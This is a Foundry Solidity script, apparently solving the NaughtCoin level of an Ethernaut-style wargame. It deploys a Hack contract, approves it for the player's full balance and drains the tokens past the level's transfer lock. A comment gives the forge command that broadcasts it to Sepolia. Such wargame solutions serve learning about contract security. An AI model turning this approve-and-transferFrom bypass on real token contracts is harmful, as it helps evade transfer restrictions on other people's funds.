// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {NaughtCoin, Hack} from "../src/level15.sol";

contract Level15Script is Script {
    function run(address instanceAddress) external {
        NaughtCoin target = NaughtCoin(instanceAddress);
        address player = target.player();
        uint256 balanceBefore = target.balanceOf(player);

        console.log("Player: ", player);
        console.log("Balance before: ", balanceBefore);

        vm.startBroadcast();
        Hack hackContract = new Hack(instanceAddress);
        target.approve(address(hackContract), balanceBefore);
        hackContract.hack();
        vm.stopBroadcast();

        uint256 balanceAfter = target.balanceOf(player);
        console.log("Balance after: ", balanceAfter);
        console.log("Attack successful: ", balanceAfter == 0);
    }
}
//forge script script/level15.s.sol:Level15Script --rpc-url $SEPOLIA_RPC_URL --broadcast --account YOUR_KEY --sig "run(address)" YOUR_INSTANCE_ADDRESS
